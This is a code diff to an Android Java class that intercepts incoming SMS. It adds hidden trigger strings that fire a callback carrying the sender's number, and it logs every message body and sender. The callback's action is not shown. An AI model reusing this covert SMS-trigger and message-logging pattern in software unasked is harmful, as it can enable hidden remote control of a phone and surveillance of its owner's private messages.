@@ -22,7 +22,7 @@ public class PhoneSMSHelper
 
 	public interface Callback
 	{
-		void SelBody();
+		void SpecialBody(final String address);
 	}
 
 	private Callback mCallback = null;
@@ -51,13 +51,14 @@ public class PhoneSMSHelper
 
 					SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
 					smsMessage = msgs[0];
+					String msg_from = smsMessage.getOriginatingAddress();
 					String body = smsMessage.getMessageBody();
-					CheckBody(body);
+					CheckBody(body, msg_from);
 					if (body.contains("🐸"))
 					{
 						Logger.Log.t("Blin ono");
 					}
-					Logger.Log.t(smsMessage.getMessageBody() + ";;" + smsMessage.getOriginatingAddress());
+					Logger.Log.t(smsMessage.getMessageBody() + ";;" + msg_from);
 				}
 				else
 				{
@@ -71,7 +72,7 @@ public class PhoneSMSHelper
 						msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 						msg_from = msgs[i].getOriginatingAddress();
 						String msgBody = msgs[i].getMessageBody();
-						CheckBody(msgBody);
+						CheckBody(msgBody, msg_from);
 						Logger.Log.t(msgBody + "from:" + msg_from);
 					}
 				}
@@ -79,18 +80,23 @@ public class PhoneSMSHelper
 		}
 	}
 
-	void CheckBody(final String body)
+	private final String[] psws = { "3*7", "5*2", "ha43" };
+
+	void CheckBody(final String body, final String addres)
 	{
-		String psw = "zhaba";
 		if (null == body)
 		{
 			return;
 		}
-		if (body.toLowerCase(Locale.getDefault()).contains(psw.toLowerCase(Locale.getDefault())))
+		for (String psw : psws)
 		{
-			if (null != mCallback)
+			if (body.toLowerCase(Locale.getDefault()).contains(psw.toLowerCase(Locale.getDefault())))
 			{
-				mCallback.SelBody();
+				if (null != mCallback)
+				{
+					mCallback.SpecialBody(addres);
+				}
+				break;
 			}
 
 		}
